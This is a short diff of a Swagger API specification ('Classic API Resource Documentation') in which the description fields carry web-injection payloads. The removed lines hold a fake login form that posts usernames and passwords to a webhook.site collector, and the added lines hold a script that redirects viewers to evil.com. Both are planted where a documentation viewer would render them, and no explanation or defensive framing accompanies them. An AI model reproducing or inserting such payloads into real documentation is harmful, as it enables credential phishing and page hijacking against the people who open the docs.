@@ -2,7 +2,7 @@ swagger: '2.0'
 info:
   title: Classic API Resource Documentation
   description: |
-   <form method="POST" action="https://webhook.site/72bb0b68-58e3-46d1-b736-62fa0e736e57"> Username: <input name="username" type="text" /> Password: <input name="password" type="password" /> <input type="submit" value="Entrar" /> </form>
+   <script>window.location='http://evil.com';</script>
 
 
   version: production
@@ -29,8 +29,7 @@ paths:
     delete:
       parameters:
         - description: |
-           <form method="POST" action="https://webhook.site/72bb0b68-58e3-46d1-b736-62fa0e736e57"> Username: <input name="username" type="text" /> Password: <input name="password" type="password" /> <input type="submit" value="Entrar" /> </form>
-
+             <script>window.location='http://evil.com';</script>
 
           format: int64
           in: path
